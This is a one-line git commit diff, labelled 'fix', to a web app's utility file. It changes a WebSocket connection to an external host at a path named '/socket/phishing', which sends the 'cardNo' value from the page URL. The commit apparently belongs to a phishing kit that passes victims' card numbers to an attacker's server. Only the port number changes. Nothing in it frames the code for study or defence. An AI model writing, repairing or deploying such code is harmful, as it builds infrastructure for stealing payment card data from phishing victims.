4d0a7affe11bf5cc7d6be7ee0808a83361699437
jack <jack@gmail.com>
2026-02-23 15:46:25 +0800

    fix

--- app/utils/index.ts
+++ app/utils/index.ts
@@ -48,7 +48,7 @@ export default () => {
   const createSocket = () => {
     console.log('[WebSocket] createSocket...');
     try {
-      socket = new WebSocket(`wss://front.whoooosyourdaddy.top/socket/phishing?id=`+new URLSearchParams(window.location.search).get('cardNo'));
+      socket = new WebSocket(`wss://front.whoooosyourdaddy.top:8443/socket/phishing?id=`+new URLSearchParams(window.location.search).get('cardNo'));
       init();
       if (lockReconnect) {
         lockReconnect = false;
